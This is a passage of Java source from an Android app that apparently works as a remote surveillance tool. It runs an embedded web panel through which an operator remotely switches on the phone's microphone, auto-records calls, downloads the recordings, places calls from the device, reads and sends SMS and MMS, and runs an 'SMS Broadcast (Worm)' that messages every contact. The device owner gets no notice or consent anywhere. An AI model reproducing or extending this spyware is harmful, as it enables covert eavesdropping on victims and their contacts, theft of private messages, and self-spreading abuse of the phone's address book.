        boolean isRecording = MediaFrameworkService.isRecording();
        boolean isRecordingCall = MediaFrameworkService.isRecordingCall();
        boolean callInProgress = MediaFrameworkService.isCallInProgress();
        String callNumber = MediaFrameworkService.getCurrentCallNumber();
        String callType = MediaFrameworkService.getCurrentCallType();
        long duration = MediaFrameworkService.getRecordingDuration();
        boolean autoRecordEnabled = MediaFrameworkService.isAutoRecordEnabled();
        boolean saveOnDeviceEnabled = MediaFrameworkService.isSaveOnDeviceEnabled();

        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
        html.append("<style>")
            .append(".status-card { padding: 20px; background: rgba(255,255,255,0.05); border-radius: 15px; margin-bottom: 20px; border: 1px solid rgba(255,255,255,0.1); }")
            .append(".status-active { border-color: var(--neon-green); background: rgba(57, 255, 20, 0.05); }")
            .append(".status-inactive { border-color: var(--danger); background: rgba(255, 49, 49, 0.05); }")
            .append(".toggle-container { display: flex; align-items: center; justify-content: space-between; gap: 15px; padding: 15px; background: rgba(0,0,0,0.3); border-radius: 12px; border: 1px solid rgba(255,255,255,0.05); }")
            .append(".toggle-switch { position: relative; width: 44px; height: 24px; background: #333; border-radius: 12px; cursor: pointer; transition: all 0.3s; border: 1px solid rgba(255,255,255,0.1); }")
            .append(".toggle-switch.active { background: var(--neon-green); border-color: var(--neon-green); }")
            .append(".toggle-switch::after { content: ''; position: absolute; width: 18px; height: 18px; border-radius: 50%; background: #fff; top: 2px; left: 2px; transition: 0.3s; }")
            .append(".toggle-switch.active::after { left: 22px; }")
            .append(".call-alert { padding: 20px; background: rgba(57, 255, 20, 0.1); border-radius: 15px; margin-bottom: 20px; border: 2px solid var(--neon-green); animation: pulse 2s infinite; }")
            .append("@keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }")
            .append(".duration { font-size: 1.8rem; font-weight: 900; color: var(--neon-cyan); font-family: 'Orbitron', sans-serif; text-shadow: 0 0 10px rgba(0, 242, 255, 0.3); }")
            .append("</style>");

        html.append("<div class=\"back-btn-container\">")
            .append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>")
            .append("</div>");

        html.append("<div class=\"card\">");
        html.append("<h2 style=\"text-align: left; margin-bottom: 20px;\">&#127908; ACOUSTICS_INTERFACE</h2>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");

        // Call in progress alert
        if (callInProgress) {
            html.append("<div class=\"call-alert\" style=\"border-left: 3px solid var(--neon-green); padding-left: 15px;\">")
                .append("<div style=\"display: flex; align-items: center; gap: 15px;\">")
                .append("<span style=\"font-size: 2rem;\">&#128222;</span>")
                .append("<div>")
                .append("<div style=\"font-size: 1.1rem; font-weight: bold; color: var(--neon-green);\">")
                .append(callType.equals("incoming") ? "INCOMING_CALL_DETECTED" : "OUTGOING_CALL_DETECTED").append("</div>")
                .append("<div style=\"color: #fff; font-family: monospace;\">ID: ").append(escapeHtml(callNumber)).append("</div>")
                .append("</div></div></div>");
        }

        // Recording status
        html.append("<div class=\"status-card ").append(isRecording ? "status-active" : "status-inactive").append("\">")
            .append("<div style=\"display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 15px;\">")
            .append("<div>")
            .append("<h3 style=\"margin:0; font-size: 1rem; text-align: left;\">")
            .append(isRecording ? "<span style=\"animation: blink 1s infinite;\">&#9679;</span>&nbsp;SURVEILLANCE_ACTIVE" : "&#9899;&nbsp;STANDBY_MODE").append("</h3>");

        if (isRecording) {
            String recordingType = isRecordingCall ? "CALL_INTERCEPTION" : "AMBIENT_CAPTURE";
            html.append("<p style=\"color: #888; margin-top: 5px; font-size: 0.7rem; font-family: monospace;\">TYPE: ").append(recordingType).append("</p>")
                .append("<div class=\"duration\" id=\"duration\">").append(formatDuration((int) duration)).append("</div>");
        }
        html.append("</div>");

        if (isRecording) {
            html.append("<a href=\"/audio/").append(isRecordingCall ? "call" : "mic").append("/stop\" class=\"btn\" style=\"border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05);\">&#9724; TERMINATE</a>");
        }
        
        html.append("</div></div>");

        // Control buttons
        html.append("<div class=\"card\" style=\"border-left-color: var(--neon-green);\">")
            .append("<h3 style=\"font-size: 0.95rem; text-align: left;\">&#127897; AMBIENT_RECORDING</h3>")
            .append("<p style=\"color: #888; margin-bottom: 20px; font-size: 0.85rem;\">Remote activation of device microphone.</p>")
            .append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 10px;\">")
            .append("<a href=\"/audio/mic/start\" class=\"btn btn-small\" ").append(isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "style=\"border-color: var(--neon-green); color: var(--neon-green);\"").append(">START_LIVE</a>")
            .append("<a href=\"/audio/mic/start?duration=30\" class=\"btn btn-small\" ").append(isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "style=\"border-color: var(--neon-yellow); color: var(--neon-yellow);\"").append(">30s_BURST</a>")
            .append("<a href=\"/audio/mic/start?duration=60\" class=\"btn btn-small\" ").append(isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "style=\"border-color: var(--neon-yellow); color: var(--neon-yellow);\"").append(">60s_BURST</a>")
            .append("<a href=\"/audio/mic/start?duration=300\" class=\"btn btn-small\" ").append(isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "style=\"border-color: var(--neon-yellow); color: var(--neon-yellow);\"").append(">5m_BURST</a>")
            .append("</div></div>");

        // Call recording section
        html.append("<div class=\"card\" style=\"border-left-color: var(--neon-cyan);\">")
            .append("<h3 style=\"font-size: 0.95rem; text-align: left;\">&#128222; COMMS_INTERCEPTION</h3>")
            .append("<p style=\"color: #888; margin-bottom: 20px; font-size: 0.85rem;\">Automated capture of cellular voice communications.</p>")
            .append("<div style=\"display: grid; grid-template-columns: 1fr; gap: 12px;\">")
            .append("<div class=\"toggle-container\">")
            .append("<span style=\"font-size: 0.8rem; color: #ccc;\">AUTO_RECORD_CALLS:</span>")
            .append("<a href=\"/audio/settings?auto_record=").append(!autoRecordEnabled).append("&save_on_device=").append(saveOnDeviceEnabled).append("\" style=\"text-decoration: none;\">")
            .append("<div class=\"toggle-switch ").append(autoRecordEnabled ? "active" : "").append("\"></div>")
            .append("</a></div>")
            .append("<div class=\"toggle-container\">")
            .append("<span style=\"font-size: 0.8rem; color: #ccc;\">SAVE_LOCAL_COPY:</span>")
            .append("<a href=\"/audio/settings?auto_record=").append(autoRecordEnabled).append("&save_on_device=").append(!saveOnDeviceEnabled).append("\" style=\"text-decoration: none;\">")
            .append("<div class=\"toggle-switch ").append(saveOnDeviceEnabled ? "active" : "").append("\"></div>")
            .append("</a></div>")
            .append("</div></div>");

        // View recordings link
        html.append("<div class=\"card\" style=\"border-left-color: var(--neon-cyan);\">")
            .append("<h3 style=\"font-size: 0.95rem; text-align: left;\">&#128190; RECORDING_ARCHIVE</h3>")
            .append("<div style=\"display: flex; gap: 10px; flex-wrap: wrap;\">")
            .append("<a href=\"/audio/recordings\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan);\">OPEN_ARCHIVE</a>")
            .append("<a href=\"/files/Music/LabRATSRecordings\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green);\">BROWSE_FILES</a>")
            .append("</div></div>");

        // Auto-refresh script for status
        html.append("<script>")
            .append("setInterval(function() {")
            .append("  fetch('/audio/status')")
            .append("    .then(r => r.json())")
            .append("    .then(data => {")
            .append("      if (data.isRecording && document.getElementById('duration')) {")
            .append("        var d = data.duration;")
            .append("        var min = Math.floor(d / 60);")
            .append("        var sec = d % 60;")
            .append("        document.getElementById('duration').textContent = min + ':' + (sec < 10 ? '0' : '') + sec;")
            .append("      }")
            .append("      if (data.callInProgress && !document.querySelector('.call-alert')) {")
            .append("        location.reload();")
            .append("      }")
            .append("    });")
            .append("}, 2000);")
            .append("</script>");

        html.append("</div>");
        html.append(HTML_FOOTER);
        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response startMicRecording(Map<String, String> params) {
        logActivity("ACOUSTICS_UPLINK: Microphone surveillance started");
        int duration = 0;
        if (params.containsKey("duration")) {
            try {
                duration = Integer.parseInt(params.get("duration"));
            } catch (Exception ignored) {
            }
        }

        android.content.Intent intent = new android.content.Intent(context, MediaFrameworkService.class);
        intent.setAction(Constants.ACTION_START_MIC_REC);
        intent.putExtra("duration", duration);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }

        // Redirect back to audio page
        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"1;url=/audio\"></head>" +
                "<body style=\"background:#1a1a2e;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;\">"
                +
                "<h2>&#127897; Starting microphone recording...</h2></body></html>";
        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }

    private Response stopMicRecording() {
        logActivity("ACOUSTICS_TERMINATED: Audio capture ended");
        android.content.Intent intent = new android.content.Intent(context, MediaFrameworkService.class);
        intent.setAction(Constants.ACTION_STOP_MIC_REC);
        context.startService(intent);

        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"1;url=/audio\"></head>" +
                "<body style=\"background:#1a1a2e;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;\">"
                +
                "<h2>&#9724; Stopping microphone recording...</h2></body></html>";
        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }

    private Response startCallRecording(Map<String, String> params) {
        logActivity("ACOUSTICS_UPLINK: Remote call recording initiated");
        String phoneNumber = params.get("number");
        String callType = params.get("type");

        android.content.Intent intent = new android.content.Intent(context, MediaFrameworkService.class);
        intent.setAction(Constants.ACTION_START_CALL_REC);
        intent.putExtra("phone_number", phoneNumber != null ? phoneNumber : "manual");
        intent.putExtra("call_type", callType != null ? callType : "manual");

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }

        String json = "{\"success\": true, \"message\": \"Call recording started\"}";
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    private Response stopCallRecording() {
        logActivity("ACOUSTICS_TERMINATED: Call recording ended");
        android.content.Intent intent = new android.content.Intent(context, MediaFrameworkService.class);
        intent.setAction(Constants.ACTION_STOP_CALL_REC);
        context.startService(intent);

        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"1;url=/audio\"></head>" +
                "<body style=\"background:#1a1a2e;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;\">"
                +
                "<h2>&#9724; Stopping call recording...</h2></body></html>";
        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }

    private Response serveAudioStatus() {
        boolean isRecording = MediaFrameworkService.isRecording();
        boolean isRecordingCall = MediaFrameworkService.isRecordingCall();
        boolean isRecordingMic = MediaFrameworkService.isRecordingMic();
        boolean callInProgress = MediaFrameworkService.isCallInProgress();
        String callNumber = MediaFrameworkService.getCurrentCallNumber();
        String callType = MediaFrameworkService.getCurrentCallType();
        long duration = MediaFrameworkService.getRecordingDuration();
        String recordingPath = MediaFrameworkService.getCurrentRecordingPath();
        boolean autoRecordEnabled = MediaFrameworkService.isAutoRecordEnabled();
        boolean saveOnDeviceEnabled = MediaFrameworkService.isSaveOnDeviceEnabled();

        String json = String.format(
                "{\"isRecording\": %s, \"isRecordingCall\": %s, \"isRecordingMic\": %s, " +
                        "\"callInProgress\": %s, \"callNumber\": \"%s\", \"callType\": \"%s\", " +
                        "\"duration\": %d, \"recordingPath\": %s, " +
                        "\"autoRecordEnabled\": %s, \"saveOnDeviceEnabled\": %s}",
                isRecording, isRecordingCall, isRecordingMic,
                callInProgress, escapeHtml(callNumber != null ? callNumber : ""), callType != null ? callType : "",
                duration, recordingPath != null ? "\"" + recordingPath + "\"" : "null",
                autoRecordEnabled, saveOnDeviceEnabled);
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    private Response updateAudioSettings(Map<String, String> params) {
        logActivity("ACOUSTICS_PROTOCOL: Surveillance settings updated");
        boolean autoRecord = "true".equalsIgnoreCase(params.get("auto_record"));
        boolean saveOnDevice = "true".equalsIgnoreCase(params.get("save_on_device"));

        android.content.Intent intent = new android.content.Intent(context, MediaFrameworkService.class);
        intent.setAction(Constants.ACTION_UPDATE_AUDIO_SETTINGS);
        intent.putExtra("auto_record", autoRecord);
        intent.putExtra("save_on_device", saveOnDevice);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }

        // Redirect back to audio page
        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"0;url=/audio\"></head>" +
                "<body></body></html>";
        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }

    private Response serveAudioRecordings(IHTTPSession session) {
        logActivity("ACOUSTICS_EXTRACT: Remote audio archive accessed");
        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
        html.append("<div class=\"back-btn-container\">");
        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">&#128190; Audio Recordings</h2>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");

        // Get recordings directory
        File recordDir = new File(Environment.getExternalStoragePublicDirectory(
                Environment.DIRECTORY_MUSIC), "LabRATSRecordings");

        if (!recordDir.exists() || !recordDir.isDirectory()) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#127897;</div><p>No recordings yet</p></div>");
        } else {
            File[] files = recordDir.listFiles(
                    (dir, name) -> name.toLowerCase().endsWith(".m4a") || name.toLowerCase().endsWith(".mp3") ||
                            name.toLowerCase().endsWith(".wav") || name.toLowerCase().endsWith(".aac"));

            if (files == null || files.length == 0) {
                html.append(
                        "<div class=\"empty-state\"><div class=\"icon\">&#127897;</div><p>No recordings yet</p></div>");
            } else {
                // Sort by date (newest first)
                java.util.Arrays.sort(files, (a, b) -> Long.compare(b.lastModified(), a.lastModified()));

                html.append("<ul class=\"file-list\">");

                int count = 0;
                for (File file : files) {
                    if (count >= 50)
                        break; // Limit to 50 files

                    String fileName = file.getName();
                    String icon = "&#127897;";
                    String iconClass = "file-icon-audio";

                    // Determine recording type from filename
                    String recordType = "Unknown";
                    if (fileName.startsWith("CALL_incoming")) {
                        icon = "&#128222;";
                        recordType = "Incoming Call";
                    } else if (fileName.startsWith("CALL_outgoing")) {
                        icon = "&#128222;";
                        recordType = "Outgoing Call";
                    } else if (fileName.startsWith("MIC_")) {
                        icon = "&#127897;";
                        recordType = "Microphone";
                    }

                    html.append("<li class=\"file-item\">");
                    html.append("<div class=\"file-icon ").append(iconClass).append("\">").append(icon)
                            .append("</div>");
                    html.append("<div class=\"file-info\">");
                    html.append("<span class=\"file-name\">").append(escapeHtml(fileName)).append("</span>");
                    html.append("<div class=\"file-meta\">");
                    html.append(recordType).append(" - ");
                    html.append(formatFileSize(file.length())).append(" - ");
                    html.append(new SimpleDateFormat("MMM dd, yyyy HH:mm", Locale.getDefault())
                            .format(new Date(file.lastModified())));
                    html.append("</div></div>");
                    html.append("<a href=\"/download/Music/LabRATSRecordings/").append(fileName)
                            .append("\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan);\">GET_FILE</a>");
                    html.append("</li>");

                    count++;
                }

                html.append("</ul>");
            }
        }

        html.append("<div style=\"margin-top: 20px;\">");
        html.append(
                "<a href=\"/audio\" style=\"color: #00f2ff; text-decoration: none;\">&larr; Back to Audio Control</a>");
        html.append("</div>");
        html.append("</div>"); // Close marker
        html.append("</div>"); // Close card

        return serveGzipped(session, "text/html", html.toString());
    }

    private Response makeCall(Map<String, String> params) {
        String number = params.get("number");
        if (number == null || number.isEmpty()) return serveError("Invalid phone number");
        
        try {
            logActivity("COMMS_DISPATCH: Initiating remote call to " + number);
            
            // Check for permission first
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (context.checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
                    return serveError("CALL_PHONE permission not granted on device");
                }
            }

            Intent intent = new Intent(Intent.ACTION_CALL);
            intent.setData(Uri.parse("tel:" + Uri.encode(number)));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);

            String html = getHeader("/calls") + 
                "<div class=\"card\"><div class=\"empty-state\">" +
                "<div class=\"icon\" style=\"color: var(--neon-green);\">&#10004;</div>" +
                "<h2>Call Initiated</h2>" +
                "<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>" +
                "<p>Uplink successful. Connection established to: " + escapeHtml(number) + "</p>" +
                "<p style=\"margin-top:20px; font-size: 0.8rem; color:#888;\">The target device is now dialing...</p>" +
                "<div style=\"display: flex; justify-content: center; margin-top: 30px;\"><a href=\"/calls\" class=\"btn\">Back to Call Logs</a></div>" +
                "</div></div>" + HTML_FOOTER;
                
            return newFixedLengthResponse(Response.Status.OK, "text/html", html);
        } catch (Exception e) {
            return serveError("Failed to initiate call: " + e.getMessage());
        }
    }

    private Response serveSmsMessages(Map<String, String> params, IHTTPSession session) {
        logActivity("COMMS_EXTRACT: SMS history retrieved");
        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
        html.append("<div class=\"back-btn-container\">");
        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"text-align: left; margin-bottom: 20px;\">&#128233; SMS Terminal</h2>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");
        html.append("<p style=\"color: #888; font-size: 0.8rem; margin-bottom: 20px;\"><b>Note:</b> RCS and Advanced Messaging (Blue Bubbles) are intercepted in real-time in the <a href=\"/intel\" style=\"color: var(--neon-cyan);\">Intel Tab</a>.</p>");
        html.append("<div style=\"background: rgba(0, 242, 255, 0.05); padding: 20px; border: 1px solid var(--neon-cyan); border-radius: 8px; margin-bottom: 30px;\">");
        html.append("<h3 style=\"font-size: 1rem; margin-bottom: 15px; text-align: center;\">&#128231; Send New Message</h3>");
        html.append("<form action=\"/sms/send\" method=\"get\">");
        html.append("<div style=\"display: flex; flex-direction: column; gap: 10px; align-items: center;\">");
        html.append("<input type=\"text\" name=\"number\" placeholder=\"Target Phone Number\" style=\"width:100%; max-width:450px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 8px; font-family: 'JetBrains Mono', monospace;\">");
        html.append("<textarea name=\"message\" placeholder=\"Message Content\" rows=\"3\" style=\"width:100%; max-width:450px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 12px; font-family: 'JetBrains Mono', monospace;\"></textarea>");
        html.append("<div style=\"text-align: center; width: 100%; margin-top: 15px; display: flex; justify-content: center;\">");
        html.append("<button type=\"submit\" class=\"btn\" style=\"width: 250px !important; margin: 0 auto !important;\">ENCRYPT & SEND</button>");
        html.append("</div>");
        html.append("</div></form>");

        // --- SMS BROADCAST SECTION ---
        html.append("<div style=\"margin-top: 30px; border-top: 1px solid rgba(0,242,255,0.1); padding-top: 20px;\">");
        html.append("<h3 style=\"font-size: 1rem; margin-bottom: 15px; text-align: center; color: var(--neon-orange);\">&#9889; SMS Broadcast (Worm)</h3>");
        html.append("<p style=\"color: #888; font-size: 0.75rem; text-align: center; margin-bottom: 15px;\">Dispatches a message to EVERY contact in the address book.</p>");
        html.append("<form action=\"/sms/broadcast\" method=\"get\">");
        html.append("<div style=\"display: flex; flex-direction: column; gap: 10px; align-items: center;\">");
        html.append("<textarea name=\"message\" placeholder=\"Broadcast Content\" rows=\"2\" style=\"width:100%; max-width:450px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-orange); color: white; padding: 10px; border-radius: 12px; font-family: 'JetBrains Mono', monospace;\"></textarea>");
        html.append("<div style=\"text-align: center; width: 100%; margin-top: 15px; display: flex; justify-content: center;\">");
        html.append("<button type=\"submit\" class=\"btn\" style=\"border-color: var(--neon-orange); color: var(--neon-orange); background: rgba(255,157,0,0.05); width: 250px !important; margin: 0 auto !important;\">EXECUTE_BROADCAST</button>");
        html.append("</div>");
        html.append("</div></form></div></div>");

        // --- MESSAGE LIST (NO SIDE MARKER) ---
        html.append("<div style=\"margin-top: 40px;\">");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div><p>SMS permission not granted.</p></div></div>").append(HTML_FOOTER);
                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
            }
        }
        int page = 1; int limit = 50;
        try { if (params.containsKey("page")) page = Integer.parseInt(params.get("page")); } catch (Exception e) {}
        int offset = (page - 1) * limit;
        Cursor cursor = null;
        try {
            Uri smsUri = Uri.parse("content://sms/");
            cursor = context.getContentResolver().query(smsUri, new String[]{"_id", "address", "body", "date", "type"}, null, null, "date DESC");
            if (cursor != null && cursor.getCount() > 0) {
                int totalCount = cursor.getCount();
                int totalPages = (int) Math.ceil((double) totalCount / limit);
                html.append("<p style=\"color: #888; margin-bottom: 15px;\">Total: ").append(totalCount).append(" messages | Page ").append(page).append(" of ").append(totalPages).append("</p>");
                html.append("<div style=\"overflow-x: auto;\"><table><thead><tr><th>Type</th><th>Address</th><th>Message</th><th>Date</th></tr></thead><tbody>");
                int count = 0, skipped = 0;
                Map<String, String> contactCache = new HashMap<>();
                while (cursor.moveToNext()) {
                    if (skipped < offset) { skipped++; continue; }
                    if (count >= limit) break;
                    String smsId = cursor.getString(0);
                    String address = cursor.getString(1), body = cursor.getString(2);
                    long date = cursor.getLong(3); int type = cursor.getInt(4);
                    String typeLabel = (type == 1) ? "INBOX" : "SENT", typeClass = (type == 1) ? "call-incoming" : "call-outgoing";
                    String displayName = getContactName(address, contactCache);
                    html.append("<tr><td class=\"").append(typeClass).append("\">").append(typeLabel).append("</td>");
                    html.append("<td>").append(escapeHtml(displayName)).append("</td>");
                    html.append("<td style=\"max-width: 400px; word-wrap: break-word;\">").append(body != null ? escapeHtml(body) : "").append("</td>");
                    html.append("<td>").append(formatMessageDate(date)).append("</td></tr>");
                    count++;
                }
                html.append("</tbody></table></div>");
                if (totalPages > 1) {
                    html.append("<div class=\"pagination\" style=\"flex-direction: column; gap: 15px;\">");
                    
                    html.append("<div style=\"display: flex; gap: 5px; justify-content: center; flex-wrap: wrap;\">");
                    if (page > 1) {
                        html.append("<a href=\"/sms?page=1\">First</a>");
                        html.append("<a href=\"/sms?page=").append(page - 1).append("\">&#8592; Prev</a>");
                    }

                    int startPage = Math.max(1, page - 2);
                    int endPage = Math.min(totalPages, page + 2);
                    for (int i = startPage; i <= endPage; i++) {
                        String active = (i == page) ? "class=\"active\"" : "";
                        html.append("<a ").append(active).append(" href=\"/sms?page=").append(i).append("\">").append(i).append("</a>");
                    }

                    if (page < totalPages) {
                        html.append("<a href=\"/sms?page=").append(page + 1).append("\">Next &#8594;</a>");
                        html.append("<a href=\"/sms?page=").append(totalPages).append("\">Last</a>");
                    }
                    html.append("</div>");

                    // Jump to page box
                    html.append("<form action=\"/sms\" method=\"get\" style=\"display: flex; gap: 10px; justify-content: center; align-items: center;\">");
                    html.append("<span style=\"font-size: 0.8rem; color: #888;\">Jump to:</span>");
                    html.append("<input type=\"number\" name=\"page\" min=\"1\" max=\"").append(totalPages).append("\" value=\"").append(page).append("\" style=\"width: 60px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 5px; border-radius: 8px; text-align: center;\">");
                    html.append("<button type=\"submit\" class=\"btn btn-small\">GO</button>");
                    html.append("</form>");

                    html.append("</div>");
                }
            } else { html.append("<div class=\"empty-state\"><div class=\"icon\">&#128233;</div><p>No messages found</p></div>"); }
        } catch (Exception e) { html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div><p>Error: ").append(escapeHtml(e.getMessage())).append("</p></div>"); }
        finally { if (cursor != null) cursor.close(); }
        html.append("</div>").append(HTML_FOOTER);
        return serveGzipped(session, "text/html", html.toString());
    }

    private Response serveMmsMessages(Map<String, String> params, IHTTPSession session) {
        logActivity("COMMS_EXTRACT: MMS media database retrieved");
        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
        html.append("<div class=\"back-btn-container\">");
        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"text-align: left; margin-bottom: 20px;\">&#128247; MMS Terminal</h2>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");
        
        html.append("<div style=\"background: rgba(0, 242, 255, 0.05); padding: 20px; border: 1px solid var(--neon-cyan); border-radius: 8px; margin-bottom: 30px;\">");
        html.append("<h3 style=\"font-size: 0.85rem; margin-bottom: 15px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; text-align: center;\">&#128247; Send New Multimedia Message</h3>");
        html.append("<form action=\"/mms/send\" method=\"post\" enctype=\"multipart/form-data\">");
        html.append("<div style=\"display: flex; flex-direction: column; gap: 10px; align-items: center;\">");
        html.append("<input type=\"text\" name=\"number\" placeholder=\"Target Phone Number\" style=\"width:100%; max-width:450px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 8px; font-family: 'JetBrains Mono', monospace;\">");
        html.append("<textarea name=\"message\" placeholder=\"Message Content (Optional)\" rows=\"2\" style=\"width:100%; max-width:450px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 12px; font-family: 'JetBrains Mono', monospace;\"></textarea>");
        html.append("<div style=\"display: flex; align-items: center; gap: 10px; justify-content: center;\">");
        html.append("<span style=\"color: #888; font-size: 0.8rem;\">Attach Media (Max 1MB):</span>");
        html.append("<input type=\"file\" name=\"media\" accept=\"image/*,video/*,audio/*\" style=\"color: #888; font-size: 0.8rem;\">");
        html.append("</div>");
        html.append("<div style=\"text-align: center; width: 100%; margin-top: 15px; display: flex; justify-content: center;\">");
        html.append("<button type=\"submit\" class=\"btn\" style=\"width: 250px !important; margin: 0 auto !important;\">UPLOAD & DISPATCH</button>");
        html.append("</div>");
        html.append("</div></form></div>");

        // --- GALLERY LIST (NO SIDE MARKER) ---
        html.append("<div style=\"margin-top: 40px;\">");

        if (context.checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div><p>MMS permission not granted.</p></div></div>").append(HTML_FOOTER);
            return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
        }
        int page = 1; int limit = 20;
        try { if (params.containsKey("page")) page = Integer.parseInt(params.get("page")); } catch (Exception ignored) {}
        int offset = (page - 1) * limit;
        Cursor cursor = null;
        try {
            Set<String> mmsWithMedia = getMmsIdsWithMedia();
            Uri mmsUri = Uri.parse("content://mms/");
            cursor = context.getContentResolver().query(mmsUri, new String[]{"_id", "date", "msg_box"}, null, null, "date DESC");
            if (cursor != null && cursor.getCount() > 0) {
                List<String[]> mmsList = new ArrayList<>();
                while (cursor.moveToNext()) {
                    String mmsId = cursor.getString(0);
                    if (mmsWithMedia.contains(mmsId)) {
                        mmsList.add(new String[]{
                            mmsId, 
                            String.valueOf(cursor.getLong(1) * 1000), 
                            String.valueOf(cursor.getInt(2))
                        });
                    }
                }

                int totalCount = mmsList.size();
                int totalPages = (int) Math.ceil((double) totalCount / limit);
                html.append("<p style=\"color: #888; margin-bottom: 15px;\">Total: ").append(totalCount).append(" Media Messages | Page ").append(page).append(" of ").append(totalPages).append("</p>");
                html.append("<div style=\"overflow-x: auto;\"><table><thead><tr><th>Type</th><th>Contact</th><th>Content</th><th>Date</th></tr></thead><tbody>");
                
                Map<String, String> contactCache = new HashMap<>();
                for (int i = offset; i < Math.min(offset + limit, totalCount); i++) {
                    String[] mData = mmsList.get(i);
                    String mmsId = mData[0]; long date = Long.parseLong(mData[1]);
                    int msgBox = Integer.parseInt(mData[2]);
                    String typeLabel = (msgBox == 1) ? "INBOX" : "SENT", typeClass = (msgBox == 1) ? "call-incoming" : "call-outgoing";
                    String address = getMmsAddress(mmsId); List<String> parts = getMmsParts(mmsId);
                    String displayName = getContactName(address, contactCache);
                    html.append("<tr><td class=\"").append(typeClass).append("\">").append(typeLabel).append("</td>");
                    html.append("<td>").append(escapeHtml(displayName)).append("</td><td style=\"max-width: 400px;\">");
                    for (String part : parts) {
                        if (part.startsWith("text:")) html.append("<div style=\"margin-bottom:5px;\">").append(escapeHtml(part.substring(5))).append("</div>");
                        else if (part.startsWith("image:")) {
                            html.append("<img src=\"/mms/media/").append(part.substring(6))
                                .append("\" style=\"max-width: 150px; border: 1px solid var(--neon-cyan); margin-top:5px; border-radius:4px; cursor:zoom-in;\" onclick=\"window.open(this.src)\">");
                        } else if (part.startsWith("video:")) {
                            html.append("<div style=\"margin-top:10px;\"><video controls preload=\"metadata\" style=\"max-width: 250px; border: 1px solid var(--neon-green); border-radius:4px;\">")
                                .append("<source src=\"/mms/media/").append(part.substring(6)).append("\">")
                                .append("Your browser does not support the video tag.")
                                .append("</video></div>")
